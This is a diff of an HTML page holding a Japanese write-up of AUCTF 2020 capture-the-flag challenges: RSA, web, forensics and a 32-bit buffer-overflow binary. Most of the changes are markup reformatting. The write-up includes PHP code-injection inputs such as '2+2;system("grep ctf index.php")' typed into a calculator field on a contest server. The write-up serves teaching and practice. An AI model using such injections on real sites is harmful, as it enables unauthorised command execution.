@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.74.2 with theme even" />
+<meta name="generator" content="Hugo 0.119.0 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/auctf_2020/" />
@@ -35,24 +35,20 @@
 
 
 
-<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link href="https://captureamerica.github.io/writeups/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
 
 
 
 <meta property="og:title" content="AUCTF 2020 Writeup" />
 <meta property="og:description" content="(2020/04/11 - 復習しました) URL: https://ctf.auburn.edu/challenges チャレンジ数が多かった！！ 時間が足りない。 Bashの問題 ([Over The Wire](https://overthewire.org/wargames/) みたいなやつ)とか、いろいろ面白いチャレンジもありました" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/auctf_2020/" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/auctf_2020/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2020-04-06T13:00:00+09:00" />
 <meta property="article:modified_time" content="2020-04-11T17:00:00+09:00" />
 <meta itemprop="name" content="AUCTF 2020 Writeup">
-<meta itemprop="description" content="(2020/04/11 - 復習しました) URL: https://ctf.auburn.edu/challenges チャレンジ数が多かった！！ 時間が足りない。 Bashの問題 ([Over The Wire](https://overthewire.org/wargames/) みたいなやつ)とか、いろいろ面白いチャレンジもありました">
-<meta itemprop="datePublished" content="2020-04-06T13:00:00&#43;09:00" />
-<meta itemprop="dateModified" content="2020-04-11T17:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="6417">
-
-
-
+<meta itemprop="description" content="(2020/04/11 - 復習しました) URL: https://ctf.auburn.edu/challenges チャレンジ数が多かった！！ 時間が足りない。 Bashの問題 ([Over The Wire](https://overthewire.org/wargames/) みたいなやつ)とか、いろいろ面白いチャレンジもありました"><meta itemprop="datePublished" content="2020-04-06T13:00:00+09:00" />
+<meta itemprop="dateModified" content="2020-04-11T17:00:00+09:00" />
+<meta itemprop="wordCount" content="6528">
 <meta itemprop="keywords" content="CTF,Reviewed," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="AUCTF 2020 Writeup"/>
 <meta name="twitter:description" content="(2020/04/11 - 復習しました) URL: https://ctf.auburn.edu/challenges チャレンジ数が多かった！！ 時間が足りない。 Bashの問題 ([Over The Wire](https://overthewire.org/wargames/) みたいなやつ)とか、いろいろ面白いチャレンジもありました"/>
@@ -271,7 +267,7 @@ Bashの問題 ([Over The Wire](https://overthewire.org/wargames/) みたいな�
 <img src="https://captureamerica.github.io/writeups/img/auctf_2020_Score1.png" alt="auctf_2020_Score1.png">
 <img src="https://captureamerica.github.io/writeups/img/auctf_2020_Score2.png" alt="auctf_2020_Score2.png">
 <img src="https://captureamerica.github.io/writeups/img/auctf_2020_Score3.png" alt="auctf_2020_Score3.png">
-<p><br /></p>
+<br />
 <img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall1.png" alt="auctf_2020_Chall1.png">
 <img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall2.png" alt="auctf_2020_Chall2.png">
 <img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall3.png" alt="auctf_2020_Chall3.png">
@@ -292,7 +288,7 @@ Bashの問題 ([Over The Wire](https://overthewire.org/wargames/) みたいな�
 <table><tr><td bgcolor="#f8f5ec">
 [145213650433152, 4562349440334, 24272724667960, 598242834066721, 89584939111364, 426756492371444, 511701778613016, 551732685650248, 296367799892003, 63113462897284, 198510931603899, 321201931522255, 401044612595398, 542697603423052, 213898535689643, 275839755798105, 185841409622217, 551732685650248, 121188708737752, 401044612595398, 512808963720303, 275839755798105, 198510931603899, 275839755798105, 401044612595398, 174484844253615, 551732685650248, 174486913717420, 575163265381617, 213898535689643, 401044612595398, 49103824223436, 551732685650248, 401044612595398, 598242834066721, 202722428784490, 306606077829794, 53801100921263, 401044612595398, 184805755675232, 405971446461049, 296367799892003, 275839755798105, 275839755798105, 401044612595398, 358054299396778, 4562349440334, 320837325468842, 401044612595398, 202722428784490, 551732685650248, 321201931522255, 228350651363859]
 </td></tr></table>
-<p><br /></p>
+<br />
 <h3 id="solution">Solution</h3>
 <p>1個ずつRsaCtfTool.pyで解きます。trコマンドを使ってmessage.txtの &ldquo;,&rdquo; を &ldquo;\n&rdquo; に変換してcipher.txtとして保存しておきました。</p>
 <pre>
@@ -353,50 +349,50 @@ $ for c in $(cat cipher.txt); do ~/Python3/RsaCtfTool/RsaCtfTool.py -n 627585038
 [+] Clear text : b'\x00\x00\x00\x00\x00\x00y'
 [+] Clear text : b'\x00\x00\x00\x00\x00\x00}'
 </pre>
-<p><br />
-結果を rsa_result.txt として保存（エラーの行は削除）して、後ろから2文字目だけを取り出します。</p>
+<br />
+結果を rsa_result.txt として保存（エラーの行は削除）して、後ろから2文字目だけを取り出します。
 <pre>
 $ cat rsa_result.txt | rev | cut -c 2 | tr -d "\n" ; echo
 auctf{R34lLy_Pr1M3s_w1L1_n3vEr_b3_thI5_Sm411_BuT_h3y}
 </pre>
-<p><br />
-Flag: <code>auctf{R34lLy_Pr1M3s_w1L1_n3vEr_b3_thI5_Sm411_BuT_h3y}</code></p>
+<br />
+Flag: `auctf{R34lLy_Pr1M3s_w1L1_n3vEr_b3_thI5_Sm411_BuT_h3y}`
 <p><br /><br />
 <br /><br /></p>
 <h2 id="web-miyazaki-trivia">[Web]: Miyazaki Trivia</h2>
 <hr>
 <h3 id="challenge-1">Challenge</h3>
 <blockquote>
-<p><a href="http://challenges.auctf.com">http://challenges.auctf.com</a>:30020
+<p><a href="http://challenges.auctf.com:30020">http://challenges.auctf.com:30020</a>
 <br /><br />
 Here&rsquo;s a bit of trivia for you vidya game nerds.</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-1">Solution</h3>
 <p>robots.txtにアクセスすると、以下が書かれています。</p>
 <table><tr><td bgcolor="#f8f5ec">
 VIDEO GAME TRIVIA: What is the adage of Byrgenwerth scholars? MAKE a GET request to this page with a header named 'answer' to submit your answer.
 fear the old blood. but master willem
 </td></tr></table>
-<p><br />
-adage についていろいろ調べて試したところ、<code>Fear the Old Blood</code>が正解みたいです。</p>
+<br />
+adage についていろいろ調べて試したところ、`Fear the Old Blood`が正解みたいです。
 <pre>
 $ curl -H "answer:Fear the Old Blood" http://challenges.auctf.com:30020/robots.txt
 Master Willem was right.auctf{f3ar_z_olD3_8l0oD}
 </pre>
-<p><br />
-Flag: <code>auctf{f3ar_z_olD3_8l0oD}</code></p>
+<br />
+Flag: `auctf{f3ar_z_olD3_8l0oD}`
 <p><br /><br />
 <br /><br /></p>
 <h2 id="web-quick-maths">[Web]: Quick Maths</h2>
 <hr>
 <h3 id="challenge-2">Challenge</h3>
 <blockquote>
-<p><a href="http://challenges.auctf.com">http://challenges.auctf.com</a>:30021
+<p><a href="http://challenges.auctf.com:30021">http://challenges.auctf.com:30021</a>
 <br /><br />
 two plus two is four minus three that&rsquo;s one quick maths</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-2">Solution</h3>
 <p>Webにアクセスすると、テキストボックスがあって、そこで計算をしてくれるようです。</p>
 <p><code>2+2;phpinfo()</code> を試したところ、phpinfoが取れました。</p>
@@ -408,26 +404,26 @@ two plus two is four minus three that&rsquo;s one quick maths</p>
 -rwxr-xr-x 1 www-data www-data 130736 Apr 4 09:09 ls
 -rw-r--r-- 1 www-data www-data 6 Apr 4 09:02 test.txt
 </pre>
-<p><br />
-どうやら、date, lsはELFファイルで、おそらく他の人のテストによって生成されちゃったファイル。</p>
+<br />
+どうやら、date, lsはELFファイルで、おそらく他の人のテストによって生成されちゃったファイル。
 <p>test.txtも関係ないファイルでした。</p>
 <p>index.phpの中にフラグがあると予想して、<code>2+2;system(&quot;grep ctf index.php&quot;)</code> でフラグを取りました。</p>
-<p><br />
-Flag: <code>auctf{p6p_1nj3c7i0n_iz_k3wl}</code></p>
+<br />
+Flag: `auctf{p6p_1nj3c7i0n_iz_k3wl}`
 <p><br /><br />
 <br /><br /></p>
 <h2 id="web-gg-no-re">[Web]: gg no re</h2>
 <hr>
 <h3 id="challenge-3">Challenge</h3>
 <blockquote>
-<p><a href="http://challenges.auctf.com">http://challenges.auctf.com</a>:30022
+<p><a href="http://challenges.auctf.com:30022">http://challenges.auctf.com:30022</a>
 <br /><br />
 A junior dev built this site but we want you to test it before we send it to production.</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-3">Solution</h3>
 <p>ページのソースを見ると、以下のjsファイルが見つかります。</p>
-<p><a href="http://challenges.auctf.com">http://challenges.auctf.com</a>:30022/authentication.js</p>
+<p><a href="http://challenges.auctf.com:30022/authentication.js">http://challenges.auctf.com:30022/authentication.js</a></p>
 <p><br /><br />
 authentication.jsの中にbase64でエンコードされた箇所があるので、とりあえずデコードしてみます。</p>
 <pre>
@@ -476,10 +472,10 @@ auctf{1_w@s_laZ_w1t_dis_0N3}
 $ curl -d flag http://challenges.auctf.com:30022/api/final.php
 auctf{1_w@s_laZ_w1t_dis_0N3}
 </pre>
-<p><br />
-Flag: <code>auctf{1_w@s_laZ_w1t_dis_0N3}</code></p>
-<p><br />
-＃ところで、チャレンジ名の <code>gg no re</code> はどういう意味なんでしょうね。そっちの方がナゾです。</p>
+<br />
+Flag: `auctf{1_w@s_laZ_w1t_dis_0N3}`
+<br />
+＃ところで、チャレンジ名の `gg no re` はどういう意味なんでしょうね。そっちの方がナゾです。
 <p><br /><br />
 <br /><br /></p>
 <h2 id="forensics-block2">[Forensics]: Block2</h2>
@@ -500,15 +496,15 @@ INSERT INTO `co_block` (`rowid`, `time`, `user`, `rolled_back`, `wid`, `x`, `y`,
 (612512,	1581375173,	3,	0,	1,	612,	5,	1757,	2,	0,	NULL,	'43',	1),
 (612513,	1581375173,	3,	0,	1,	610,	5,	1759,	2,	0,	NULL,	'43',	1),
 </pre>
-<p><br /></p>
+<br />
 <h3 id="solution-4">Solution</h3>
 <p>INSERT INTO の行から、各Columnの意味がわかります。<code>time</code>と<code>rolled_back</code>だけに注目したらよさそうです。</p>
 <pre>
 $ grep '^(' co_block.sql | cut -d, -f2,4 | grep 1$
 	1581060905,	1
 </pre>
-<p><br />
-Flag: <code>auctf{1581060905}</code></p>
+<br />
+Flag: `auctf{1581060905}`
 <p><br /><br />
 <br /><br /></p>
 <h2 id="forensics-animal-crossing">[Forensics]: Animal Crossing</h2>
@@ -521,7 +517,7 @@ Flag: <code>auctf{1581060905}</code></p>
 <ul>
 <li>animalcrossing.pcapng</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-5">Solution</h3>
 <p>pcapにいろいろ含まれていますが、<code>weird traffic</code> と言えばDNSが明らかに怪しいです。</p>
 <pre>
@@ -547,18 +543,18 @@ $ tshark -r animalcrossing.pcapng dns | grep "A " | grep -v AAAA | grep -v respo
   684  11.324828   10.1.1.103 → 10.1.1.10    DNS 74 Standard query 0xe9db A www.odrive.com
 </pre>
 <p>（最後のwww.odrive.comは無視します。）</p>
-<p><br />
-名前のところだけ取り出します。</p>
+<br />
+名前のところだけ取り出します。
 <pre>
 $ tshark -r animalcrossing.pcapng dns | grep "A " | grep -v AAAA | grep -v response | grep -v "org." | awk '{print $12}' | cut -d. -f1 | tr -d "\n"
 </pre>
-<p><br /></p>
+<br />
 <p>base64でデコードするとフラグが見つかります。</p>
 <table><tr><td bgcolor="#f8f5ec">
 Did you ever hear the tragedy of Darth Plagueis The Wise? I thought not. It’s not a story the Jedi would tell you. It’s a Sith legend. Darth Plagueis was a Dark Lord of the Sith, so powerful and so wise he could use the Force to influence the midichlorians to create life… <font color="red">auctf{it_was_star_wars_all_along}</font> He had such a knowledge of the dark side that he could even keep the ones he cared about from dying. The dark side of the Force is a pathway to many abilities some consider to be unnatural. He became so powerful… the only thing he was afraid of was losing his power, which eventually, of course, he did. Unfortunately, he taught his apprentice everything he knew, then his apprentice killed him in his sleep. Ironic. He could save others from death, but base64: invalid input
 </td></tr></table>
-<p><br />
-Flag: <code>auctf{it_was_star_wars_all_along}</code></p>
+<br />
+Flag: `auctf{it_was_star_wars_all_along}`
 <p><br /><br />
 <br /><br /></p>
 <h2 id="pwn-thanksgiving-dinner">[Pwn]: Thanksgiving Dinner</h2>
@@ -575,12 +571,12 @@ Note: ASLR is disabled for this challenge</p>
 <ul>
 <li>turkey (ELF 32bit)</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-6">Solution</h3>
 <p>Ghidraでソースを確認します。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -618,42 +614,42 @@ Note: ASLR is disabled for this challenge</p>
 </span><span class="lnt">36
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined4</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="n">undefined</span> <span class="o">*</span><span class="n">puVar1</span><span class="p">;</span>
-  
-  <span class="n">puVar1</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">stack0x00000004</span><span class="p">;</span>
-  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
-  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Hi!</span><span class="se">\n</span><span class="s">Welcome to my program... it</span><span class="se">\&#39;</span><span class="s">s a little buggy...&#34;</span><span class="p">);</span>
-  <span class="n">vulnerable</span><span class="p">(</span><span class="n">puVar1</span><span class="p">);</span>
-  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="kt">void</span> <span class="nf">vulnerable</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="kt">char</span> <span class="n">local_30</span> <span class="p">[</span><span class="mi">16</span><span class="p">];</span>
-  <span class="kt">int</span> <span class="n">local_20</span><span class="p">;</span>
-  <span class="kt">int</span> <span class="n">local_1c</span><span class="p">;</span>
-  <span class="kt">int</span> <span class="n">local_18</span><span class="p">;</span>
-  <span class="kt">int</span> <span class="n">local_14</span><span class="p">;</span>
-  <span class="kt">int</span> <span class="n">local_10</span><span class="p">;</span>
-  
-  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Hey I heard you are searching for flags! Well I</span><span class="se">\&#39;</span><span class="s">ve got one. :)&#34;</span><span class="p">);</span>
-  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Here you can have part of it!&#34;</span><span class="p">);</span>
-  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;auctf{&#34;</span><span class="p">);</span>
-  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Sorry that</span><span class="se">\&#39;</span><span class="s">s all I got!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-  <span class="n">local_10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-  <span class="n">local_14</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
-  <span class="n">local_18</span> <span class="o">=</span> <span class="mh">0x14</span><span class="p">;</span>
-  <span class="n">local_1c</span> <span class="o">=</span> <span class="mh">0x14</span><span class="p">;</span>
-  <span class="n">local_20</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
-<span class="hl">  <span class="n">fgets</span><span class="p">(</span><span class="n">local_30</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
-</span>  <span class="k">if</span> <span class="p">((((</span><span class="n">local_10</span> <span class="o">==</span> <span class="mh">0x1337</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">&lt;</span> <span class="o">-</span><span class="mh">0x14</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_1c</span> <span class="o">!=</span> <span class="mh">0x14</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
-     <span class="p">((</span><span class="n">local_18</span> <span class="o">==</span> <span class="mh">0x667463</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_20</span> <span class="o">==</span> <span class="mh">0x2a</span><span class="p">))))</span> <span class="p">{</span>
-    <span class="n">print_flag</span><span class="p">();</span>
-  <span class="p">}</span>
-  <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined4</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined</span> <span class="o">*</span><span class="n">puVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="n">puVar1</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">stack0x00000004</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Hi!</span><span class="se">\n</span><span class="s">Welcome to my program... it</span><span class="se">\&#39;</span><span class="s">s a little buggy...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">vulnerable</span><span class="p">(</span><span class="n">puVar1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vulnerable</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_30</span> <span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_1c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_18</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_14</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Hey I heard you are searching for flags! Well I</span><span class="se">\&#39;</span><span class="s">ve got one. :)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Here you can have part of it!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;auctf{&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Sorry that</span><span class="se">\&#39;</span><span class="s">s all I got!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_14</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_18</span> <span class="o">=</span> <span class="mh">0x14</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_1c</span> <span class="o">=</span> <span class="mh">0x14</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_20</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line hl"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">local_30</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((((</span><span class="n">local_10</span> <span class="o">==</span> <span class="mh">0x1337</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">&lt;</span> <span class="o">-</span><span class="mh">0x14</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_1c</span> <span class="o">!=</span> <span class="mh">0x14</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">     <span class="p">((</span><span class="n">local_18</span> <span class="o">==</span> <span class="mh">0x667463</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_20</span> <span class="o">==</span> <span class="mh">0x2a</span><span class="p">))))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">print_flag</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
 <br>
@@ -664,7 +660,7 @@ fgets()の箇所でlocal_30に入力ができますが、バッファのサイ�
 `(local_14 < -0x14)` の判定が少しわかりにくいですが、ここはアセンブラで見た方がわかりやすいかもです。
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -683,23 +679,24 @@ fgets()の箇所でlocal_30に入力ができますが、バッファのサイ�
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c">   <span class="mh">0x565562df</span> <span class="o">&lt;+</span><span class="mi">143</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x56556040</span> <span class="o">&lt;</span><span class="n">fgets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
-   <span class="mh">0x565562e4</span> <span class="o">&lt;+</span><span class="mi">148</span><span class="o">&gt;:</span>	<span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
-   <span class="mh">0x565562e7</span> <span class="o">&lt;+</span><span class="mi">151</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x1337</span>
-   <span class="mh">0x565562ee</span> <span class="o">&lt;+</span><span class="mi">158</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x56556310</span> <span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span>
-<span class="hl"><span class="o">=&gt;</span> <span class="mh">0x565562f0</span> <span class="o">&lt;+</span><span class="mi">160</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x10</span><span class="p">],</span><span class="mh">0xffffffec</span>
-</span>   <span class="mh">0x565562f4</span> <span class="o">&lt;+</span><span class="mi">164</span><span class="o">&gt;:</span>	<span class="n">jge</span>    <span class="mh">0x56556310</span> <span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span>
-   <span class="mh">0x565562f6</span> <span class="o">&lt;+</span><span class="mi">166</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x18</span><span class="p">],</span><span class="mh">0x14</span>
-   <span class="mh">0x565562fa</span> <span class="o">&lt;+</span><span class="mi">170</span><span class="o">&gt;:</span>	<span class="n">je</span>     <span class="mh">0x56556310</span> <span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span>
-   <span class="mh">0x565562fc</span> <span class="o">&lt;+</span><span class="mi">172</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x14</span><span class="p">],</span><span class="mh">0x667463</span>
-   <span class="mh">0x56556303</span> <span class="o">&lt;+</span><span class="mi">179</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x56556310</span> <span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span>
-   <span class="mh">0x56556305</span> <span class="o">&lt;+</span><span class="mi">181</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x1c</span><span class="p">],</span><span class="mh">0x2a</span>
-   <span class="mh">0x56556309</span> <span class="o">&lt;+</span><span class="mi">185</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x56556310</span> <span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span>
-   <span class="mh">0x5655630b</span> <span class="o">&lt;+</span><span class="mi">187</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x56556360</span> <span class="o">&lt;</span><span class="n">print_flag</span><span class="o">&gt;</span>
-   <span class="mh">0x56556310</span> <span class="o">&lt;+</span><span class="mi">192</span><span class="o">&gt;:</span>	<span class="n">nop</span>
-   <span class="mh">0x56556311</span> <span class="o">&lt;+</span><span class="mi">193</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
-   <span class="mh">0x56556314</span> <span class="o">&lt;+</span><span class="mi">196</span><span class="o">&gt;:</span>	<span class="n">leave</span>  
-   <span class="mh">0x56556315</span> <span class="o">&lt;+</span><span class="mi">197</span><span class="o">&gt;:</span>	<span class="n">ret</span>   </code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">   <span class="mh">0x565562df</span> <span class="o">&lt;+</span><span class="mi">143</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x56556040</span> <span class="o">&lt;</span><span class="n">fgets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x565562e4</span> <span class="o">&lt;+</span><span class="mi">148</span><span class="o">&gt;:</span>	<span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x565562e7</span> <span class="o">&lt;+</span><span class="mi">151</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x1337</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x565562ee</span> <span class="o">&lt;+</span><span class="mi">158</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x56556310</span> <span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span>
+</span></span><span class="line hl"><span class="cl"><span class="o">=&gt;</span> <span class="mh">0x565562f0</span> <span class="o">&lt;+</span><span class="mi">160</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x10</span><span class="p">],</span><span class="mh">0xffffffec</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x565562f4</span> <span class="o">&lt;+</span><span class="mi">164</span><span class="o">&gt;:</span>	<span class="n">jge</span>    <span class="mh">0x56556310</span> <span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x565562f6</span> <span class="o">&lt;+</span><span class="mi">166</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x18</span><span class="p">],</span><span class="mh">0x14</span>
